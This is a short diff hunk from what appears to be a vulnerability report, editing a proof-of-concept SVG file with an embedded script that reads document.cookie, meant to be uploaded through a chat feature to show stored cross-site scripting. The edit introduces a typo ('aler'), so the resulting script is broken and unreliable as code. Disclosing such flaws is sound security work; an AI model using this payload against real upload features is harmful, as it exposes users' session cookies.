@@ -24,7 +24,7 @@ Step 3: Navigate to chat and upload a svg file via upload functionality with bel
 
 <svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
    <script type="text/javascript">
-      alert(document.cooki);
+      aler(document.cookie);
    </script>
 </svg>
 ```
